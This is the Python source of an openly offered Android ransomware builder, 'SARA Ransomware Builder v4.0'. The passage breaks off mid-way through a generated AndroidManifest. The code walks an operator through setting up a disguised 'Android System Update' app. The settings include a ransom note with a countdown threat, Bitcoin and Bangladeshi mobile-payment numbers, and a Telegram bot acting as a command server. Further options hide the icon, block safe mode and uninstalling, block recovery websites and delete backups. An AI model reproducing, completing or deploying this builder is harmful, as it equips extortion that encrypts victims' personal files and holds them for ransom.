#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔥 SARA RANSOMWARE BUILDER v4.0 🔥
# NON-ROOT ANDROID • FULL CUSTOMIZATION
# DEVELOPED BY: @biswa_yt 🔥🔥
# WORM-AI💀🔥 SIGNATURE EDITION

import os
import sys
import shutil
import random
import string
import subprocess
import base64
import json
import time
import hashlib
from datetime import datetime
from pathlib import Path
import zipfile
import xml.etree.ElementTree as ET

# ============================================
# DEVELOPER CREDENTIALS
# ============================================
DEV_TAG = "[ @biswa_yt 🔥🔥]"
VERSION = "4.0-ULTIMATE"
AUTHOR = "@biswa_yt 🔥🔥"
SIGNATURE = "WORM-AI💀🔥 x @biswa_yt"

# ============================================
# COLOR CODES
# ============================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ============================================
# BANNER — DEVELOPER TAG INCLUDED
# ============================================
def banner():
    print(f"""{RED}
╔═══════════════════════════════════════════════════════════════════╗
║                    🔥 SARA BUILDER v{VERSION} 🔥                    ║
║              NON-ROOT ANDROID RANSOMWARE GENERATOR                ║
║                    DEVELOPED BY @biswa_yt 🔥🔥                     ║
╠═══════════════════════════════════════════════════════════════════╣
║  ███████╗ █████╗ ██████╗  █████╗                                 ║
║  ██╔════╝██╔══██╗██╔══██╗██╔══██╗                                ║
║  ███████╗███████║██████╔╝███████║                                ║
║  ╚════██║██╔══██║██╔══██╗██╔══██║                                ║
║  ███████║██║  ██║██║  ██║██║  ██║                                ║
║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                ║
╠═══════════════════════════════════════════════════════════════════╣
║  [+] NON-ROOT TARGET      [+] AES-256 ENCRYPTION                 ║
║  [+] FULL CUSTOMIZATION   [+] TELEGRAM C2 SERVER                 ║
║  [+] APK SIGNING          [+] PERSISTENCE ENABLED                ║
║  [+] DEVICE ADMIN         [+] SAFE MODE DISABLE                  ║
║  [+] HIDE APP ICON        [+] ANTI-UNINSTALL                     ║
║  [+] DECRYPTOR GENERATOR  [+] RANSOM NOTE CUSTOM                ║
╚═══════════════════════════════════════════════════════════════════╝
{RESET}""")
    print(f"{MAGENTA}{DEV_TAG}{RESET}")
    print(f"{CYAN}[+] SYSTEM READY • DEVELOPER: {AUTHOR}{RESET}\n")

# ============================================
# RANSOMWARE CONFIGURATION CLASS
# ============================================
class RansomwareConfig:
    def __init__(self):
        # CORE CONFIG — DEVELOPER TAG EMBEDDED
        self.dev_tag = "@biswa_yt 🔥🔥"
        self.builder_version = VERSION
        
        # APP CONFIGURATION
        self.app_name = ""
        self.package_name = ""
        self.version_name = ""
        self.version_code = ""
        self.app_description = ""
        self.icon_path = ""
        
        # RANSOM NOTE CONFIG
        self.ransom_note_title = ""
        self.ransom_note_message = ""
        self.encryption_extension = ""
        
        # PAYMENT CONFIG — BANGLADESH SPECIAL
        self.bitcoin_address = ""
        self.bkash_number = ""
        self.nagad_number = ""
        self.rocket_number = ""
        self.ransom_amount_usd = ""
        self.ransom_amount_bdt = ""
        
        # CONTACT CONFIG
        self.contact_email = ""
        self.telegram_username = ""
        self.whatsapp_number = ""
        
        # TELEGRAM C2 CONFIG
        self.telegram_bot_token = ""
        self.telegram_chat_id = ""
        
        # DECRYPTION CONFIG
        self.decryption_password = ""
        self.countdown_hours = ""
        
        # ADVANCED FEATURES
        self.wallpaper_change = False
        self.hide_app_icon = False
        self.disable_safe_mode = False
        self.prevent_uninstall = False
        self.block_google = False
        self.delete_backups = False
        self.encrypt_sdcard = False
        
    def generate_random_package(self):
        """Generate random package name with dev tag hash"""
        random_str = ''.join(random.choices(string.ascii_lowercase, k=8))
        hash_obj = hashlib.md5(f"biswa_yt_{random_str}".encode())
        hash_prefix = hash_obj.hexdigest()[:4]
        return f"com.system.{random_str}.{hash_prefix}"
    
    def generate_encryption_extension(self):
        """Generate random encryption extension with dev signature"""
        extensions = [".worm", ".locked", ".enc", ".biswa", ".yt", ".crypted", ".ransom", ".sara"]
        return random.choice(extensions) + ''.join(random.choices(string.ascii_lowercase, k=3))
    
    def generate_password(self, length=16):
        """Generate random decryption password"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choices(chars, k=length))
    
    def to_dict(self):
        """Convert config to dictionary with dev metadata"""
        return {
            "developer": self.dev_tag,
            "builder_version": self.builder_version,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "app_name": self.app_name,
            "package_name": self.package_name,
            "version_name": self.version_name,
            "version_code": self.version_code,
            "app_description": self.app_description,
            "ransom_note_title": self.ransom_note_title,
            "ransom_note_message": self.ransom_note_message,
            "encryption_extension": self.encryption_extension,
            "bitcoin_address": self.bitcoin_address,
            "bkash_number": self.bkash_number,
            "nagad_number": self.nagad_number,
            "rocket_number": self.rocket_number,
            "ransom_amount_usd": self.ransom_amount_usd,
            "ransom_amount_bdt": self.ransom_amount_bdt,
            "contact_email": self.contact_email,
            "telegram_username": self.telegram_username,
            "whatsapp_number": self.whatsapp_number,
            "telegram_bot_token": "HIDDEN" if self.telegram_bot_token else None,
            "telegram_chat_id": "HIDDEN" if self.telegram_chat_id else None,
            "decryption_password": self.decryption_password,
            "countdown_hours": self.countdown_hours,
            "wallpaper_change": self.wallpaper_change,
            "hide_app_icon": self.hide_app_icon,
            "disable_safe_mode": self.disable_safe_mode,
            "prevent_uninstall": self.prevent_uninstall,
            "block_google": self.block_google,
            "delete_backups": self.delete_backups,
            "encrypt_sdcard": self.encrypt_sdcard
        }

# ============================================
# CONFIGURATION COLLECTOR — BANGLADESH EDITION
# ============================================
def collect_configuration():
    """Collect all ransomware configuration from user"""
    config = RansomwareConfig()
    
    print(f"\n{BOLD}{CYAN}[•] RANSOMWARE CONFIGURATION WIZARD — DEVELOPED BY @biswa_yt 🔥🔥{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════{RESET}\n")
    
    # 1. APP NAME
    print(f"{YELLOW}[?]{RESET} Enter ransomware app name (victim will see this):")
    config.app_name = input(f"{GREEN}➜{RESET} ").strip()
    if not config.app_name:
        config.app_name = "Android System Update"
        print(f"  {BLUE}[i]{RESET} Using default: {config.app_name}")
    
    # 2. PACKAGE NAME
    print(f"\n{YELLOW}[?]{RESET} Enter package name (unique identifier):")
    print(f"  {BLUE}[i]{RESET} Leave empty for auto-generate with @biswa_yt signature")
    pkg = input(f"{GREEN}➜{RESET} ").strip()
    if pkg:
        config.package_name = pkg
    else:
        config.package_name = config.generate_random_package()
        print(f"  {GREEN}✓{RESET} Generated: {config.package_name}")
    
    # 3. VERSION
    print(f"\n{YELLOW}[?]{RESET} App version name (e.g., 1.0, 2.5):")
    config.version_name = input(f"{GREEN}➜{RESET} ").strip() or "2.1"
    
    print(f"\n{YELLOW}[?]{RESET} App version code (integer):")
    config.version_code = input(f"{GREEN}➜{RESET} ").strip() or "21"
    
    # 4. APP DESCRIPTION
    print(f"\n{YELLOW}[?]{RESET} App description (shown during installation):")
    print(f"  {BLUE}[i]{RESET} Type '.' on new line to finish")
    desc_lines = []
    while True:
        line = input(f"{GREEN}  ➜{RESET} ")
        if line == ".":
            break
        desc_lines.append(line)
    config.app_description = "\n".join(desc_lines) if desc_lines else "Android system optimization tool for better performance and battery life"
    
    # 5. ICON PATH
    print(f"\n{YELLOW}[?]{RESET} Path to app icon PNG file:")
    print(f"  {BLUE}[i]{RESET} Leave empty for default icon (System Update style)")
    icon_path = input(f"{GREEN}➜{RESET} ").strip()
    if icon_path and os.path.exists(icon_path):
        config.icon_path = icon_path
    else:
        config.icon_path = "assets/default_icon.png"
        print(f"  {BLUE}[i]{RESET} Using default icon")
    
    # 6. RANSOM NOTE TITLE
    print(f"\n{YELLOW}[?]{RESET} Ransom note title (victim will see this first):")
    config.ransom_note_title = input(f"{GREEN}➜{RESET} ").strip()
    if not config.ransom_note_title:
        config.ransom_note_title = "⚠️ SYSTEM LOCKED • FILES ENCRYPTED"
    
    # 7. RANSOM NOTE MESSAGE
    print(f"\n{YELLOW}[?]{RESET} Ransom note message (detailed instructions):")
    print(f"  {BLUE}[i]{RESET} Type '.' on new line to finish")
    note_lines = []
    while True:
        line = input(f"{GREEN}  ➜{RESET} ")
        if line == ".":
            break
        note_lines.append(line)
    
    default_note = [
        "🔐 YOUR PERSONAL FILES HAVE BEEN ENCRYPTED 🔐",
        "",
        "All your photos, documents, videos, and important data",
        "have been encrypted with AES-256 military-grade algorithm.",
        "",
        "📌 TO RECOVER YOUR FILES:",
        "──────────────────────",
        "1. Send the ransom amount to the payment address below",
        "2. Email us with your transaction ID and victim ID",
        "3. You will receive decryption key within 24 hours",
        "",
        "⚠️ WARNING ⚠️",
        "──────────────────────",
        "• Do not try to decrypt files yourself",
        "• Do not use third-party recovery tools",
        "• Do not modify encrypted files",
        "• Do not uninstall this application",
        "",
        "⏳ TIME LEFT: 168 HOURS",
        "After deadline, decryption key will be PERMANENTLY DESTROYED.",
        "",
        "💀 RANSOMWARE BUILT BY @biswa_yt 🔥🔥 💀"
    ]
    
    config.ransom_note_message = "\n".join(note_lines) if note_lines else "\n".join(default_note)
    
    # 8. ENCRYPTION EXTENSION
    print(f"\n{YELLOW}[?]{RESET} File extension for encrypted files (e.g., .locked, .encrypted):")
    print(f"  {BLUE}[i]{RESET} Leave empty for random generation")
    ext = input(f"{GREEN}➜{RESET} ").strip()
    if ext:
        if not ext.startswith('.'):
            ext = '.' + ext
        config.encryption_extension = ext
    else:
        config.encryption_extension = config.generate_encryption_extension()
        print(f"  {GREEN}✓{RESET} Generated: {config.encryption_extension}")
    
    # 9. RANSOM AMOUNT — BANGLADESH SPECIAL
    print(f"\n{YELLOW}[?]{RESET} Ransom amount in USD (e.g., 50, 100, 250):")
    config.ransom_amount_usd = input(f"{GREEN}➜{RESET} ").strip() or "100"
    
    print(f"\n{YELLOW}[?]{RESET} Ransom amount in BDT (e.g., 5000, 10000, 25000):")
    config.ransom_amount_bdt = input(f"{GREEN}➜{RESET} ").strip() or "10000"
    
    # 10. PAYMENT ADDRESSES — BANGLADESH FOCUSED
    print(f"\n{YELLOW}[?]{RESET} Bitcoin address for international payment:")
    print(f"  {BLUE}[i]{RESET} Leave empty if not using Bitcoin")
    config.bitcoin_address = input(f"{GREEN}➜{RESET} ").strip()
    
    print(f"\n{YELLOW}[?]{RESET} bKash number for Bangladesh payment:")
    print(f"  {BLUE}[i]{RESET} REQUIRED for Bangladesh victims")
    config.bkash_number = input(f"{GREEN}➜{RESET} ").strip()
    
    print(f"\n{YELLOW}[?]{RESET} Nagad number for Bangladesh payment:")
    print(f"  {BLUE}[i]{RESET} Optional - second payment option")
    config.nagad_number = input(f"{GREEN}➜{RESET} ").strip()
    
    print(f"\n{YELLOW}[?]{RESET} Rocket number for Bangladesh payment:")
    print(f"  {BLUE}[i]{RESET} Optional - third payment option")
    config.rocket_number = input(f"{GREEN}➜{RESET} ").strip()
    
    # 11. CONTACT INFORMATION
    print(f"\n{YELLOW}[?]{RESET} Contact email for victim support:")
    config.contact_email = input(f"{GREEN}➜{RESET} ").strip()
    if not config.contact_email:
        config.contact_email = "recovery@tutanota.com"
    
    print(f"\n{YELLOW}[?]{RESET} Telegram username for victim contact:")
    config.telegram_username = input(f"{GREEN}➜{RESET} ").strip()
    if not config.telegram_username and config.telegram_bot_token:
        config.telegram_username = "@biswa_yt_support"  # Example
    
    print(f"\n{YELLOW}[?]{RESET} WhatsApp number for victim contact:")
    config.whatsapp_number = input(f"{GREEN}➜{RESET} ").strip()
    
    # 12. TELEGRAM C2 — REPORTING SYSTEM
    print(f"\n{YELLOW}[?]{RESET} Telegram bot token for victim reporting (C2 server):")
    print(f"  {BLUE}[i]{RESET} Create bot via @BotFather, get token")
    config.telegram_bot_token = input(f"{GREEN}➜{RESET} ").strip()
    
    if config.telegram_bot_token:
        print(f"\n{YELLOW}[?]{RESET} Telegram chat ID to receive reports:")
        print(f"  {BLUE}[i]{RESET} Get ID from @userinfobot")
        config.telegram_chat_id = input(f"{GREEN}➜{RESET} ").strip()
    
    # 13. DECRYPTION PASSWORD
    print(f"\n{YELLOW}[?]{RESET} Decryption password (leave empty for auto-generate):")
    pwd = input(f"{GREEN}➜{RESET} ").strip()
    if pwd:
        config.decryption_password = pwd
    else:
        config.decryption_password = config.generate_password()
        print(f"  {GREEN}✓{RESET} Generated: {config.decryption_password}")
    
    # 14. COUNTDOWN TIMER
    print(f"\n{YELLOW}[?]{RESET} Countdown hours before key destruction:")
    print(f"  {BLUE}[i]{RESET} Recommended: 72, 96, 168")
    config.countdown_hours = input(f"{GREEN}➜{RESET} ").strip() or "168"
    
    # 15. ADVANCED FEATURES — BONUS
    print(f"\n{BOLD}{MAGENTA}[⚡] ADVANCED FEATURES — DEVELOPED BY @biswa_yt 🔥🔥{RESET}")
    
    print(f"\n{YELLOW}[?]{RESET} Change wallpaper to ransom note? (y/n):")
    config.wallpaper_change = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Hide app icon from launcher? (y/n):")
    print(f"  {BLUE}[i]{RESET} Victim won't see app in menu")
    config.hide_app_icon = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Disable safe mode? (y/n):")
    print(f"  {BLUE}[i]{RESET} Prevents victim from booting in safe mode")
    config.disable_safe_mode = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Prevent uninstall via device admin? (y/n):")
    print(f"  {BLUE}[i]{RESET} Requires device admin activation")
    config.prevent_uninstall = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Block Google recovery websites? (y/n):")
    print(f"  {BLUE}[i]{RESET} Prevents victim from searching solutions")
    config.block_google = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Delete backup files after encryption? (y/n):")
    print(f"  {BLUE}[i]{RESET} Removes .bak, .old, .backup files")
    config.delete_backups = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    print(f"\n{YELLOW}[?]{RESET} Encrypt SD card content? (y/n):")
    print(f"  {BLUE}[i]{RESET} External storage encryption")
    config.encrypt_sdcard = input(f"{GREEN}➜{RESET} ").strip().lower() == 'y'
    
    return config

# ============================================
# TEMPLATE PROCESSOR — DEVELOPER WATERMARK
# ============================================
def process_templates(config, build_dir):
    """Process and inject configuration into Android templates"""
    
    print(f"\n{CYAN}[•] Processing Android templates...{RESET}")
    print(f"{CYAN}[•] Developer watermark: {config.dev_tag}{RESET}")
    
    # Create directory structure
    package_path = config.package_name.replace('.', '/')
    java_path = f"{build_dir}/app/src/main/java/{package_path}"
    res_path = f"{build_dir}/app/src/main/res"
    
    os.makedirs(java_path, exist_ok=True)
    os.makedirs(f"{res_path}/drawable", exist_ok=True)
    os.makedirs(f"{res_path}/drawable-hdpi", exist_ok=True)
    os.makedirs(f"{res_path}/drawable-xhdpi", exist_ok=True)
    os.makedirs(f"{res_path}/drawable-xxhdpi", exist_ok=True)
    os.makedirs(f"{res_path}/layout", exist_ok=True)
    os.makedirs(f"{res_path}/values", exist_ok=True)
    os.makedirs(f"{res_path}/xml", exist_ok=True)
    
    # ========== PROCESS AndroidManifest.xml ==========
    manifest_content = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{config.package_name}"
    android:versionCode="{config.version_code}"
    android:versionName="{config.version_name}">

    <!-- STORAGE PERMISSIONS -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_INTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
    
    <!-- SYSTEM PERMISSIONS -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.SET_WALLPAPER" />
    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    
    <!-- DEVICE ADMIN PERMISSION -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <application
        android:allowBackup="false"
        android:icon="@drawable/ic_launcher"
        android:label="{config.app_name}"
        android:roundIcon="@drawable/ic_launcher"
        android:supportsRtl="false"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar"
        android:hasFragileUserData="true"
        android:persistent="true"
        android:hardwareAccelerated="true"
        android:usesCleartextTraffic="true">

        <!-- MAIN ACTIVITY - RANSOM NOTE -->
        <activity
            android:name="{config.package_name}.MainActivity"
            android:excludeFromRecents="true"
            android:launchMode="singleTask"
            android:noHistory="true"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.DeviceDefault.DialogWhenLarge"
            android:showOnLockScreen="true"
            android:showWhenLocked="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- ENCRYPTION SERVICE -->
        <service
            android:name="{config.package_name}.EncryptorService"
            android:enabled="true"
            android:exported="false"
         
